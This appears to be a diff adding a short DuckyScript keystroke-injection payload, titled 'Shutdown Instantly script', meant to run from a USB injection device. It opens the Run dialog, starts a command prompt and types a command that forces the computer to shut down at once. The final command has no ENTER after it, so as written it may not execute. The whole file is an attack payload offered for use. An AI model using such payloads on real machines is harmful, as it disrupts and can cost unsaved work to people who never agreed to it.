@@ -1,0 +1,15 @@
+REM author: Hacksaw
+REM Title: Shutdown Instantly script
+REM Description: Shutdown any pc the second you run this script.
+DELAY 1000
+GUI r 
+DELAY 1000
+STRING cmd
+DELAY 1000 
+ENTER
+DELAY 500
+STRING shutdown.exe /s /t 00
+
+
+
+
